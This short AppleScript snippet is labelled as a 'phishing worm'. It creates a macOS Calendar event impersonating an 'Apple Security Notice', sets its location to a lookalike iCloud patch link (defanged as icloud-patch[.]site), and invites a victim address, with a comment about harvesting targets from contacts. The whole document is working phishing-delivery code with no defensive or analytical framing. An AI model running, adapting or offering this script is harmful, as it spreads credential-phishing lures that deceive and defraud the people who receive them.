-- Phishing worm spreads by sending calendar events with malicious links
tell application "Calendar"
	set cal to calendar "Home"
	set e to make new event at end of events of cal with properties {
		summary:"Apple Security Notice",
		location:"https://icloud-patch[.]site",
		start date:(current date) + 1 * hours,
		end date:(current date) + 2 * hours
	}
	
	-- Add iOS target email (from contacts or predefined list)
	tell e to make new attendee at end of attendees with properties {email:"victim@icloud.com"}
end tell
